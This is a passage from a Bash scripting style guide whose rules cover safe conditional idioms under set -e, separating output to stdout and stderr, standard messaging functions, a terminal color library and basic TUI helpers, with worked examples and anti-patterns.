declare -i complete=0

# ✗ DANGEROUS: Script exits here if complete=0!
((complete)) && declare -g BLUE=$'\033[0;34m'
# (( complete )) returns 1, && short-circuits, set -e terminates script

# ✓ SAFE: Script continues even when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# || : triggers on false, returns 0, script continues
```

**Why `:` over `true`:**

```bash
# ✓ PREFERRED: Colon command
((condition)) && action || :
# - Traditional Unix idiom (Bourne shell)
# - Built-in (no fork), 1 character, POSIX standard

# ✓ ACCEPTABLE: true command
((condition)) && action || true
# - More explicit for beginners, also built-in
```

**Common patterns:**

```bash
# Pattern 1: Conditional variable declaration
declare -i complete=0 verbose=0
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
((verbose)) && declare -p NC RED GREEN YELLOW || :

# Pattern 2: Nested conditional declarations
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
else
  declare -g NC='' RED=''
  ((complete)) && declare -g BLUE='' MAGENTA='' || :
fi

# Pattern 3: Conditional block execution
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :

# Pattern 4: Multiple conditional actions
if ((flags)); then
  declare -ig VERBOSE=${VERBOSE:-1}
  ((complete)) && declare -ig DEBUG=0 DRY_RUN=1 PROMPT=1 || :
fi
```

**When to use `|| :`:**

1. **Optional variable declarations** based on feature flags
   ```bash
   ((DEBUG)) && declare -g DEBUG_OUTPUT=/tmp/debug.log || :
   ```

2. **Conditional exports**
   ```bash
   ((PRODUCTION)) && export PATH=/opt/app/bin:$PATH || :
   ```

3. **Feature-gated actions** (silent when disabled)
   ```bash
   ((VERBOSE)) && echo "Processing $file" || :
   ```

4. **Optional logging**
   ```bash
   ((LOG_LEVEL >= 2)) && log_debug "Variable value: $var" || :
   ```

**When NOT to use:**

```bash
# ✗ Wrong - suppresses critical errors
((required_flag)) && critical_operation || :

# ✓ Correct - check explicitly
if ((required_flag)); then
  critical_operation || die 1 'Critical operation failed'
fi

# ✗ Wrong - hides failure
((condition)) && risky_operation || :

# ✓ Correct - handle failure
if ((condition)) && ! risky_operation; then
  error 'risky_operation failed'
  return 1
fi
```

**Anti-patterns:**

```bash
# ✗ WRONG: No || :, script exits when condition is false
((complete)) && declare -g BLUE=$'\033[0;34m'

# ✗ WRONG: Using true (verbose, less idiomatic)
((complete)) && declare -g BLUE=$'\033[0;34m' || true

# ✗ WRONG: Complex fallback
((complete)) && declare -g BLUE=$'\033[0;34m' || { true; }

# ✗ WRONG: Suppressing critical operations
((user_confirmed)) && delete_all_files || :

# ✓ CORRECT: Check critical operations explicitly
if ((user_confirmed)); then
  delete_all_files || die 1 'Failed to delete files'
fi
```

**Alternatives comparison:**

```bash
# Alternative 1: if statement (most explicit, best for complex logic)
if ((complete)); then
  declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m'
fi

# Alternative 2: Arithmetic test with || : (concise, safe)
((complete)) && declare -g BLUE=$'\033[0;34m' || :

# Alternative 3: Double-negative (works but less readable)
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# ✗ Alternative 4: Temporarily disable errexit (NOT recommended)
set +e
((complete)) && declare -g BLUE=$'\033[0;34m'
set -e
```

**Testing the pattern:**

```bash
#!/bin/bash
set -euo pipefail

test_false_condition() {
  local -i flag=0
  ((flag)) && echo "This won't print" ||:
  echo "Test passed: false condition didn't exit"
}

test_true_condition() {
  local -i flag=1
  local -- output=''
  ((flag)) && output="executed" || :
  [[ "$output" == "executed" ]] || { echo "Test failed"; return 1; }
  echo 'Test passed: true condition executed action'
}

test_nested_conditionals() {
  local -i outer=1 inner=0 executed=0
  ((outer)) && {
    executed=1
    ((inner)) && executed=2 || :
  } || :
  ((executed == 1)) || { echo "Test failed: expected 1, got $executed"; return 1; }
  echo 'Test passed: nested conditionals work correctly'
}

test_false_condition
test_true_condition
test_nested_conditionals
echo 'All tests passed!'
```

**Summary:**
- Use `|| :` after `((condition)) && action` to prevent `set -e` exit on false
- Colon `:` preferred over `true` (traditional, concise)
- Only for optional operations - critical ops need explicit error handling
- Cross-reference: BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)

**Key principle:** `((condition)) && action || :` means "do this if true, continue if false."


---


**Rule: BCS0700**

# Input/Output & Messaging

Standardized messaging patterns with color support and proper stream handling. Core functions: `_msg()` (FUNCNAME-based), `vecho()`, `success()`, `warn()`, `info()`, `debug()`, `error()`, `die()`, `yn()`.

## STDOUT vs STDERR

- Error/status messages �' STDERR; data output �' STDOUT
- Place `>&2` at command beginning for clarity

```bash
somefunc() { >&2 echo "[$(date -Ins)]: $*"; }
```

## Standardized Messaging and Color Support

```bash
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

## Core Message Functions

Use private `_msg()` with `FUNCNAME[1]` inspection for DRY implementation.

**FUNCNAME array:** `${FUNCNAME[0]}`=current, `${FUNCNAME[1]}`=caller. Auto-detects caller for formatting without parameters.

```bash
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

**File logging (use printf builtin, not date subshell):**

```bash
log_msg() { printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*" >> "$LOG_FILE"; }

# Concurrent-safe:
log_msg() {
  { flock -n 9 || return 0; printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*"; } 9>>"$LOG_FILE"
}
```

## Usage Documentation

```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -v|--verbose      Increase verbose output
  -h|--help         This help message
EOT
}
```

## Echo vs Messaging Functions

| Context | Use |
|---------|-----|
| Operational status | Messaging functions (stderr) |
| Data output | `echo` (stdout) |
| Help/version text | `echo`/`cat` (always display) |
| Pipeable/parseable | `echo` (stdout) |
| Respects VERBOSE | Messaging functions |

```bash
# Data output - use echo
get_user_email() { echo "$email"; }

# Status - use messaging functions
info "Processing ${file@Q}..."
cat "$file"
```

**Anti-patterns:**

```bash
# ✗ Wrong - info() for data (goes to stderr, can't capture)
get_value() { info "$value"; }

# ✗ Wrong - echo for status (mixes with data in pipes)
echo "Processing..."

# ✗ Wrong - help with info() (won't show if VERBOSE=0)
show_help() { info 'Usage:...'; }
```

## Color Management Library

Two-tier system for namespace control. Source `color-set` library for sophisticated needs.

**Basic tier (5 vars):** `NC`, `RED`, `GREEN`, `YELLOW`, `CYAN`
**Complete tier (+7):** `BLUE`, `MAGENTA`, `BOLD`, `ITALIC`, `UNDERLINE`, `DIM`, `REVERSE`

```bash
source color-set complete flags  # One-line init for colors + _msg globals
```

Options: `basic`|`complete`, `auto`|`always`|`never`, `verbose`, `flags`

## TUI Basics (BCS0907)

```bash
# Spinner
spinner() {
  local -a frames=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
  local -i i=0
  while ((1)); do
    printf '\r%s %s' "${frames[i % ${#frames[@]}]}" "$*"
    i+=1; sleep 0.1
  done
}
spinner 'Processing...' &
spinner_pid=$!
# ... work ...
kill "$spinner_pid" 2>/dev/null; printf '\r\033[K'

# Progress bar
progress_bar() {
  local -i current=$1 total=$2 width=${3:-50}
  local -i filled=$((current * width / total))
  local -- bar
  bar=$(printf '%*s' "$filled" '' | tr ' ' '█')
  bar+=$(printf '%*s' "$((width - filled))" '' | tr ' ' '░')
  printf '\r[%s] %3d%%' "$bar" $((current * 100 / total))
}

# Cursor control
hide_cursor() { printf '\033[?25l'; }
show_cursor() { printf '\033[?25h'; }
trap 'show_cursor' EXIT
```

## Terminal Capabilities (BCS0908)

```bash
# Detect terminal
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' NC=$'\033[0m'
else
  declare -r RED='' NC=''
fi

# Terminal size with resize trap
get_terminal_size() {
  if [[ -t 1 ]]; then
    TERM_COLS=$(tput cols 2>/dev/null || echo 80)
    TERM_ROWS=$(tput lines 2>/dev/null || echo 24)
  else
    TERM_COLS=80; TERM_ROWS=24
  fi
}
trap 'get_terminal_size' WINCH

# Unicode check
has_unicode() { [[ "${LC_ALL:-${LC_CTYPE:-${LANG:-}}}" == *UTF-8* ]]; }
```

**Anti-patterns:**

```bash
# ✗ Wrong - TUI without terminal check
progress_bar 50 100  # Garbage if not terminal

# ✓ Correct
[[ -t 1 ]] && progress_bar 50 100 || echo '50% complete'

# ✗ Wrong - hardcoded width
printf '%-80s\n' "$text"

# ✓ Correct
printf '%-*s\n' "${TERM_COLS:-80}" "$text"
```

## Key Anti-Patterns Summary

```bash
# ✗ echo directly for errors
echo "Error: file not found"
# ✓ Use messaging function
error 'File not found'

# ✗ Duplicate message logic
info() { echo "[$SCRIPT_NAME] INFO: $*"; }
warn() { echo "[$SCRIPT_NAME] WARN: $*"; }
# ✓ Use _msg core function

# ✗ Errors to stdout
error() { echo "[ERROR] $*"; }
# ✓ Errors to stderr
error() { >&2 _msg "$@"; }

# ✗ die without customizable exit code
die() { error "$@"; exit 1; }
# ✓ Correct
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ✗ Subshell for timestamp (slow)
log_msg() { echo "[$(date '+%F %T')] $*" >> "$LOG_FILE"; }
# ✓ Builtin (10-50x faster)
log_msg() { printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*" >> "$LOG_FILE"; }
```

**Key principles:**
- Stream separation: status�'stderr, data�'stdout
- FUNCNAME inspection eliminates duplication
- Conditional functions respect VERBOSE/DEBUG flags
- Colors conditional on `[[ -t 1 && -t 2 ]]`
- Use printf `%()T` for timestamps, not date subshell


---


**Rule: BCS0701**

## Standardized Messaging and Color Support

```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Rationale:** Terminal detection via `-t 1 && -t 2` ensures colors only appear when both stdout and stderr are terminals, preventing ANSI codes in logs/pipes.

**Anti-patterns:**
```bash
# ✗ Unconditional colors (breaks pipes/logs)
declare -r RED=$'\033[0;31m'

# ✗ Missing NC reset
echo "${RED}Error"  # Terminal stays red
```


---


**Rule: BCS0702**

## STDOUT vs STDERR
- All error messages go to `STDERR`
- Place `>&2` at beginning for clarity

```bash
# Preferred
>&2 echo "[$(date -Ins)]: $*"

# Acceptable
echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
```


---


**Rule: BCS0703**

## Core Message Functions

**Implement standard messaging functions using a private `_msg()` core that detects the calling function via `FUNCNAME` to automatically format messages.**

**Rationale:** Consistent format across scripts; `FUNCNAME` inspection auto-adds prefix/color; DRY via single `_msg()` reused by all wrappers; conditional functions respect `VERBOSE`/`DEBUG`; errors/warnings to stderr, data to stdout; colors/symbols make output scannable.

### FUNCNAME Inspection

The `FUNCNAME` array contains the call stack: `${FUNCNAME[0]}` = current function, `${FUNCNAME[1]}` = caller. Instead of passing a parameter, inspect `FUNCNAME[1]` to auto-detect formatting.

```bash
process_file() {
  info "Processing ${1@Q}"
  # When info() calls _msg():
  #   FUNCNAME[1] = "info"     (determines formatting)
  #   FUNCNAME[2] = "process_file"
}
```

### Core Implementation

```bash
_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    debug)   prefix+=" ${YELLOW}DEBUG${NC}:" ;;
    *)       ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

# Conditional output (respects VERBOSE)
vecho()   { ((VERBOSE)) || return 0; _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# Debug (respects DEBUG)
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }

# Unconditional error
error()   { >&2 _msg "$@"; }

# Error and exit
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

### Color Definitions

```bash
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

### Flag Variables

```bash
declare -i VERBOSE=0  # Set to 1 for info/warn/success
declare -i DEBUG=0    # Set to 1 for debug
declare -i PROMPT=1   # Set to 0 for automation
```

### Why stdout vs stderr

```bash
data=$(./script.sh)           # Gets only data, not info messages
./script.sh 2>errors.log      # Errors to file, data to stdout
./script.sh | process_data    # Messages visible, data piped
```

### Yes/No Prompt

```bash
yn() {
  ((PROMPT)) || return 0
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

### File Logging

Use `printf '%()T'` builtin (Bash 4.2+) instead of `$(date ...)` - 10-50x faster.

**Minimal (single-process):**
```bash
log_msg() {
  printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*" >> "$LOG_FILE"
}
```

**Concurrent-safe (multi-process):**
```bash
log_msg() {
  {
    flock -n 9 || return 0
    printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*"
  } 9>>"$LOG_FILE"
}
```

### Function Variants

**Minimal (no colors/flags):**
```bash
info()  { >&2 echo "$SCRIPT_NAME: $*"; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

**Medium (VERBOSE, no colors):**
```bash
declare -i VERBOSE=0
info()  { ((VERBOSE)) && >&2 echo "$SCRIPT_NAME: $*"; return 0; }
error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
```

### Anti-Patterns

```bash
# ✗ Wrong - using echo directly (no stderr, no prefix, no color, no VERBOSE)
echo "Error: file not found"
# ✓ Correct
error 'File not found'

# ✗ Wrong - errors to stdout
error() { echo "[ERROR] $*"; }
# ✓ Correct
error() { >&2 _msg "$@"; }

# ✗ Wrong - ignoring VERBOSE
info() { >&2 _msg "$@"; }  # Always prints!
# ✓ Correct
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ✗ Wrong - die without configurable exit code
die() { error "$@"; exit 1; }
# ✓ Correct
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ✗ Wrong - spawns subshell (slow)
log_msg() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG_FILE"; }
# ✓ Correct - builtin timestamp
log_msg() { printf '[%(%Y-%m-%d %H:%M:%S)T] %s\n' -1 "$*" >> "$LOG_FILE"; }

# ✗ Wrong - yn() can't disable for automation
yn() { read -r -n 1 -p "$1 y/n " reply; [[ ${reply,,} == y ]]; }
# ✓ Correct - respects PROMPT
yn() { ((PROMPT)) || return 0; local -- REPLY; >&2 read -r -n 1 -p "$SCRIPT_NAME: $1 y/n " REPLY; >&2 echo; [[ ${REPLY,,} == y ]]; }
```

### Edge Cases

1. **Non-terminal output**: Check `[[ -t 1 && -t 2 ]]` before enabling colors
2. **Concurrent logging**: Use `flock` for multi-process scripts to prevent corruption
3. **Automation mode**: `PROMPT=0` makes `yn()` return 0 without prompting

### Summary

- Use `_msg()` with `FUNCNAME` inspection for DRY implementation
- Conditional functions respect `VERBOSE`; `error()` always displays
- Errors to stderr (`>&2`); colors conditional on terminal
- `die()` takes exit code first: `die 1 'Error'`
- `yn()` respects `PROMPT` for non-interactive mode
- Use `printf '%()T'` for logging, not `$(date ...)`


---


**Rule: BCS0704**

## Usage Documentation
```bash
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Detailed description.

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -n|--num NUM      Set num to NUM

  -v|--verbose      Increase verbose output
  -q|--quiet        No verbosity

  -V|--version      Print version ('$SCRIPT_NAME $VERSION')
  -h|--help         This help message

Examples:
  # Example 1
  $SCRIPT_NAME -v file.txt
  # Example 2
  $SCRIPT_NAME -qn 10 file.txt
EOT
}
```


---


**Rule: BCS0705**

## Echo vs Messaging Functions

**Choose between plain `echo` and messaging functions based on context and output destination. Messaging functions for operational status (stderr, respects verbosity); plain `echo` for data output (stdout, always displays).**

**Rationale:**
- **Stream Separation**: Messaging �' stderr (user-facing); `echo` �' stdout (parseable data)
- **Verbosity Control**: Messaging respects `VERBOSE`; `echo` always displays
- **Parseability**: Plain `echo` is predictable; messaging includes formatting/colors
- **Script Composition**: Proper streams enable pipelines without mixing data and status

**Use messaging functions (`info`, `success`, `warn`, `error`):**

```bash
# Operational status updates
info 'Starting database backup...'
success 'Database backup completed'
warn 'Backup size exceeds threshold'
error 'Database connection failed'

# Diagnostic/debug output
debug "Variable state: count=$count, total=$total"
info "Using configuration file ${config_file@Q}"
```

**Use plain `echo`:**

```bash
# Data output from functions
get_user_email() {
  local -- username=$1
  local -- email
  email=$(grep "^$username:" /etc/passwd | cut -d: -f5)
  echo "$email"  # Data output - must use echo
}
user_email=$(get_user_email 'alice')

# Help text (always displays, never verbose-dependent)
show_help() {
  cat <<EOT
$SCRIPT_NAME $VERSION - Brief description

Usage: $SCRIPT_NAME [Options] [arguments]

Options:
  -v|--verbose      Increase verbose output
  -h|--help         This help message
EOT
}

# Structured reports and parseable output
generate_report() {
  echo 'System Report'
  echo '============='
  df -h
}
```

**Decision matrix:**
- Operational status or data? Status �' messaging; Data �' echo
- Respect verbosity? Yes �' messaging; No �' echo
- Parsed/piped? Yes �' echo to stdout; No �' messaging to stderr
- Multi-line formatted? Yes �' echo/here-doc; No �' messaging (single-line)
- Need color/formatting? Yes �' messaging; No �' echo

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -i VERBOSE=1 DEBUG=0

# Colors (conditional on terminal)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    success) prefix+=" ${GREEN}✓${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    error)   prefix+=" ${RED}✗${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
info()    { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
debug()   { ((DEBUG)) || return 0; >&2 _msg "$@"; }
error()   { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# Data function (stdout, always output)
get_user_home() {
  local -- username=$1
  local -- home_dir
  home_dir=$(getent passwd "$username" | cut -d: -f6)
  [[ -n "$home_dir" ]] || return 1
  echo "$home_dir"  # Data to stdout
}

main() {
  local -- username=$1
  local -- user_home

  info "Looking up user ${username@Q}"  # Status to stderr

  if ! user_home=$(get_user_home "$username"); then
    error "User not found ${username@Q}"
    return 1
  fi

  success "Found user ${username@Q}"
  echo "Home: $user_home"  # Data to stdout
}

main "$@"
```

**Anti-patterns:**

```bash
# ✗ Wrong - using info() for data output
get_user_email() {
  info "$email"  # Goes to stderr! Can't be captured!
}
email=$(get_user_email alice)  # $email is empty!

# ✓ Correct - use echo for data
get_user_email() {
  echo "$email"  # Goes to stdout, can be captured
}

# ✗ Wrong - using echo for operational status
process_file() {
  echo "Processing ${file@Q}..."  # Mixes with data on stdout!
  cat "$file"
}

# ✓ Correct - messaging for status
process_file() {
  info "Processing ${file@Q}..."  # To stderr
  cat "$file"                     # Data to stdout
}

# ✗ Wrong - help text using info() (won't display if VERBOSE=0)
show_help() {
  info 'Usage: script.sh [OPTIONS]'
}

# ✓ Correct - help text using cat
show_help() {
  cat <<HELP
Usage: script.sh [OPTIONS]
  -v  Verbose mode
HELP
}

# ✗ Wrong - error messages to stdout
if [[ ! -f "$1" ]]; then
  echo "File not found ${1@Q}"  # Wrong stream!
fi

# ✓ Correct - errors to stderr
if [[ ! -f "$1" ]]; then
  error "File not found ${1@Q}"
fi
```

**Edge cases:**

**1. Version output (always display):**
```bash
show_version() {
  echo "$SCRIPT_NAME $VERSION"  # Use echo, not info()
}
```

**2. Progress during data generation:**
```bash
generate_data() {
  info 'Generating data...'     # Progress to stderr
  for ((i=1; i<=100; i+=1)); do
    echo "line $i"              # Data to stdout
  done
  success 'Complete'            # Status to stderr
}
data=$(generate_data)  # Captures only data
```

**3. Logging vs user messages:**
```bash
process_item() {
  local -- item=$1
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] Processing: $item"  # Log to stdout�'file
  info "Processing $item..."                                # User message to stderr
}
process_item "$item" >> "$log_file"
```

**Key principle:** Stream separation determines the choice. Operational messages (how script works) �' stderr via messaging. Data output (what script produces) �' stdout via echo. This enables proper piping, capturing, and redirection while keeping users informed.


---


**Rule: BCS0706**

## Color Management Library

For sophisticated color management beyond inline declarations (BCS0701), use a dedicated library providing two-tier system, terminal detection, and BCS _msg integration (BCS0703).

**Rationale:** Two-tier system prevents namespace pollution. Auto-detection/force modes handle deployment scenarios. `flags` option sets BCS control variables. Dual-purpose pattern (BCS010201) allows sourcing or executing.

**Two-Tier Color System:**

**Basic tier (5 variables):**
```bash
NC          # No Color / Reset
RED         # Error messages
GREEN       # Success messages
YELLOW      # Warnings
CYAN        # Information
```

**Complete tier (12 variables):**
```bash
# Basic tier plus:
BLUE        # Additional color option
MAGENTA     # Additional color option
BOLD        # Text emphasis
ITALIC      # Text styling
UNDERLINE   # Text emphasis
DIM         # De-emphasized text
REVERSE     # Inverted colors
```

**Library Function Signature:**

```bash
color_set [OPTIONS...]
```

**Options:**

| Option | Description |
|--------|-------------|
| `basic` | Enable basic 5-variable set (default) |
| `complete` | Enable complete 12-variable set |
| `auto` | Auto-detect terminal (checks stdout AND stderr) (default) |
| `always` | Force colors on (even when piped/redirected) |
| `never`, `none` | Force colors off |
| `verbose`, `-v`, `--verbose` | Print all variable declarations |
| `flags` | Set BCS _msg globals: VERBOSE, DEBUG, DRY_RUN, PROMPT |

**BCS _msg Integration:**

```bash
source color-set
color_set complete flags

# Now these globals are set:
# VERBOSE=1 (or preserved if already set)
# DEBUG=0
# DRY_RUN=1
# PROMPT=1
```

**Dual-Purpose Pattern (BCS010201):**

```bash
# Usage 1: Source as library (traditional)
source color-set
color_set complete
echo "${RED}Error:${NC} Failed"

# Usage 2: Source as library (enhanced - auto-calls color_set)
source color-set complete
echo "${RED}Error:${NC} Failed"

# Usage 3: Execute for demonstration
./color-set complete verbose
./color-set --help
```

**Implementation Example:**

```bash
#!/bin/bash
#shellcheck disable=SC2015
# color-set - Color management library

color_set() {
  local -i color=-1 complete=0 verbose=0 flags=0
  while (($#)); do
    case ${1:-auto} in
      complete) complete=1 ;;
      basic)    complete=0 ;;
      flags)    flags=1 ;;
      verbose|-v|--verbose)
                verbose=1 ;;
      always)   color=1 ;;
      never|none)
                color=0 ;;
      auto)     color=-1 ;;
      *)        >&2 echo "${FUNCNAME[0]}: ✗ Invalid argument ${1@Q}"
                return 2 ;;
    esac
    shift
  done

  # Auto-detect: both stdout AND stderr must be TTY
  ((color == -1)) && { [[ -t 1 && -t 2 ]] && color=1 || color=0; } ||:

  # Set BCS control flags if requested
  if ((flags)); then
    declare -igx VERBOSE=${VERBOSE:-1}
    ((complete)) && declare -igx DEBUG=0 DRY_RUN=1 PROMPT=1 || :
  fi

  # Declare color variables
  if ((color)); then
    declare -gx NC=$'\033[0m' RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m'
    ((complete)) && declare -gx BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' BOLD=$'\033[1m' ITALIC=$'\033[3m' UNDERLINE=$'\033[4m' DIM=$'\033[2m' REVERSE=$'\033[7m' || :
  else
    declare -gx NC='' RED='' GREEN='' YELLOW='' CYAN=''
    ((complete)) && declare -gx BLUE='' MAGENTA='' BOLD='' ITALIC='' UNDERLINE='' DIM='' REVERSE='' || :
  fi

  # Verbose output if requested
  if ((verbose)); then
    ((flags)) && declare -p VERBOSE ||:
    declare -p NC RED GREEN YELLOW CYAN
    ((complete)) && {
      ((flags)) && declare -p DEBUG DRY_RUN PROMPT ||:
      declare -p BLUE MAGENTA BOLD ITALIC UNDERLINE DIM REVERSE
    } ||:
  fi

  return 0
}
declare -fx color_set

# Dual-purpose pattern: enhanced syntax support
[[ ${BASH_SOURCE[0]} == "$0" ]] || {
  (($#)) && color_set "$@" || :
  return 0
}

# Executable section (only runs when executed directly)
#!/bin/bash #semantic
set -euo pipefail

declare -r VERSION=1.0.1

# Help handling
if [[ ${1:-} =~ ^(-h|--help|help)$ ]]; then
  cat <<HELP
color-set $VERSION [OPTIONS...]

Dual-purpose bash library for terminal color management with ANSI escape codes.

MODES:
  Source as library:  source color-set; color_set [OPTIONS]
  Execute directly:   color-set [OPTIONS]

OPTIONS:
  complete          Enable complete color set (12 variables)
  basic             Enable basic color set (5 variables) [default]

  always            Force colors on
  never, none       Force colors off
  auto              Auto-detect TTY [default]

  verbose, -v       Print variable declarations
  --verbose

  flags             Set standard BCS globals for _msg system messaging constructs
                    • With 'basic': Sets VERBOSE only
                    • With 'complete': Sets VERBOSE, DEBUG, DRY_RUN, PROMPT

BASIC TIER (5 variables):
  NC, RED, GREEN, YELLOW, CYAN

COMPLETE TIER (+7 additional variables):
  BLUE, MAGENTA, BOLD, ITALIC, UNDERLINE, DIM, REVERSE

EXAMPLES:
  color-set complete verbose
  color-set always
  source color-set && color_set complete && echo "\${RED}Error\${NC}"

OPTIONS can be combined in any order.
HELP
  exit 0
fi

color_set "$@"

#fin
```

**Usage Examples:**

```bash
# Basic usage
source color-set
color_set basic
echo "${RED}Error:${NC} Operation failed"
echo "${GREEN}Success:${NC} Operation completed"

# Complete tier with attributes
source color-set
color_set complete
echo "${BOLD}${RED}CRITICAL ERROR${NC}"
echo "${ITALIC}${CYAN}Note:${NC} ${DIM}Additional details${NC}"

# Force colors for piped output
source color-set
color_set complete always
./script.sh | less -R

# Integrated with BCS _msg system
source color-set complete flags
info "Starting process"        # Uses CYAN, respects VERBOSE
success "Build completed"      # Uses GREEN, respects VERBOSE
```

**Anti-patterns:**

❌ **Scattered inline declarations:**
```bash
# DON'T: Duplicate declarations across scripts
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
# ... repeated in every script
```

❌ **Testing only stdout:**
```bash
# DON'T: Incomplete terminal detection
[[ -t 1 ]] && color=1  # Fails when stderr redirected
# DO: Test both streams
[[ -t 1 && -t 2 ]] && color=1 || color=0
```

❌ **Forcing colors without user control:**
```bash
# DON'T: Hardcode color mode
color_set always
# DO: Respect environment or provide flag
color_set ${COLOR_MODE:-auto}
```

**Cross-References:** BCS0701 (inline colors), BCS0703 (_msg system), BCS010201 (dual-purpose pattern)

**Ref:** BCS0706


---


**Rule: BCS0707**

## TUI Basics

**Rule: BCS0907**

Creating text-based user interface elements in terminal scripts.

---

#### Rationale

TUI elements provide visual feedback for long-running operations, interactive prompts/menus, progress indication, and better UX.

---

#### Progress Indicators

```bash
# Simple spinner
spinner() {
